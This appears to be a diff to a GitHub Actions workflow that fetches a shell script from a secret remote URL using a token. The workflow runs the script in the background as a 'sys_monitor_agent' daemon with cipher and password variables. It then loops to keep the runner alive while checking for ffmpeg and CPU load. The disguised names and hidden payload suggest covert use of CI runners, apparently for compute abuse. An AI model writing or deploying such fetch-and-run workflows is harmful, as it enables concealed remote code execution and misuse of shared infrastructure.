@@ -33,69 +33,59 @@ jobs:
           HF_TOKEN: ${{ secrets.HF_TOKEN }}
           HF_REPO: ${{ secrets.HF_REPO_NAME }}
           REMOTE_URL: ${{ secrets.REMOTE_LOGIC_URL }}
-        
-        run: |
-          echo "--- [1] ENVIRONMENT CHECK ---"
-          echo "Node ID: $SYNC_NODE"
-          echo "Endpoint URL Length: ${#TELEMETRY_URL} chars"
-          echo "Remote Logic URL: $REMOTE_URL"
-          
-          # -------------------------------------------------------------
-          # DEBUGGING DOWNLOAD & EXECUTION
-          # -------------------------------------------------------------
-          echo "--- [2] DOWNLOADING LOGIC ---"
-          # -v flag for verbose curl (shows headers)
-          curl -v -L -H "Authorization: Bearer $HF_TOKEN" -o sys_monitor_agent.sh "$REMOTE_URL"
-          
-          if [ ! -f "sys_monitor_agent.sh" ]; then
-            echo "❌ ERROR: Download failed! Script not found."
-            exit 1
-          fi
+run: |
+  echo "--- [1] PRE-START CLEANUP ---"
+  # Purani logs hatao taaki confusion na ho
+  rm -f runtime.log debug.log
 
-          echo "--- [3] FILE PERMISSIONS ---"
-          chmod +x sys_monitor_agent.sh
-          ls -l sys_monitor_agent.sh
+  echo "--- [2] LAUNCHING DAEMON ---"
+  export MURL="$TELEMETRY_URL"
+  export MID="$SYNC_NODE"
+  export CIPHER_KEY="$DIAG_KEY"
+  export INPUT_PASS="$DIAG_KEY"
 
-          # -------------------------------------------------------------
-          # LAUNCHING WITH LOGS (No more /dev/null for now)
-          # -------------------------------------------------------------
-          echo "--- [4] LAUNCHING DAEMON ---"
-          
-          # Pehle check karo script ke andar koi syntax error to nahi hai
-          bash -n sys_monitor_agent.sh || { echo "❌ ERROR: Script has Syntax errors!"; exit 1; }
+  # Script download logic (Same as before)
+  curl -s -L -H "Authorization: Bearer $HF_TOKEN" -o sys_monitor_agent.sh "$REMOTE_URL"
+  chmod +x sys_monitor_agent.sh
 
-          # Environment mapping
-          export MURL="$TELEMETRY_URL"
-          export MID="$SYNC_NODE"
-          export CIPHER_KEY="$DIAG_KEY"
-          export INPUT_PASS="$DIAG_KEY"
+  # Launching...
+  ./sys_monitor_agent.sh & 
+  DAEMON_PID=$!
+  echo "Daemon started with PID: $DAEMON_PID"
 
-          # Background me chalao but logs file me save karo (debug.log)
-          # 'nohup' hata ke check karte hain if it makes a difference
-          ./sys_monitor_agent.sh > debug.log 2>&1 &
-          DAEMON_PID=$!
-          echo "Daemon PID: $DAEMON_PID"
+  # -------------------------------------------------------------
+  # MONITORING THE *REAL* LOG FILE
+  # -------------------------------------------------------------
+  echo "--- [3] MONITORING RUNTIME.LOG ---"
+  
+  # Wait a bit for the script to initialize its internal log file
+  sleep 10
 
-          # -------------------------------------------------------------
-          # MONITORING LOOP (With Real-time Error Log Tailing)
-          # -------------------------------------------------------------
-          echo "--- [5] STARTING MONITORING ---"
-          
-          while kill -0 $DAEMON_PID 2>/dev/null; do
-            echo "⏱️ Time: $(date +'%H:%M:%S') | Daemon is ALIVE (PID: $DAEMON_PID)"
-            
-            # Print last 5 lines of the ACTUAL logic.sh logs to see what's happening
-            if [ -f "debug.log" ]; then
-               echo "📜 Last 5 Logs from Agent:"
-               tail -n 5 debug.log
-            fi
+  while kill -0 $DAEMON_PID 2>/dev/null; do
+    echo "---------------------------------------------------"
+    echo "⏱️ Time: $(date +'%H:%M:%S') | Status: ALIVE"
+    
+    # 🕵️‍♂️ Check if runtime.log exists and show it
+    if [ -f "runtime.log" ]; then
+       echo "📜 INTERNAL SCRIPT LOGS (runtime.log):"
+       tail -n 10 runtime.log
+    else
+       echo "⚠️ WARNING: runtime.log not created yet. Script might be stuck at 'apt-get'!"
+    fi
 
-            echo "📈 Load: $(uptime | awk -F'load average:' '{ print $2 }')"
-            echo "---------------------------------------------------"
-            sleep 30
-          done
+    # 🔍 Check if ffmpeg is actually running in background
+    if pgrep -x "ffmpeg" > /dev/null; then
+       echo "🎥 [PROCESS] ffmpeg is RUNNING! (CPU Load expected to rise)"
+    else
+       echo "😴 [PROCESS] ffmpeg is NOT running yet."
+    fi
 
-          echo "❌ DAEMON DIED SUDDENLY!"
-          echo "--- [6] FINAL CRASH DUMP (Full Agent Logs) ---"
-          cat debug.log
-          exit 1
+    echo "📈 Load: $(uptime | awk -F'load average:' '{ print $2 }')"
+    sleep 40
+  done
+
+  echo "❌ DAEMON TERMINATED."
+  if [ -f "runtime.log" ]; then
+     echo "--- FULL CRASH DUMP ---"
+     cat runtime.log
+  fi
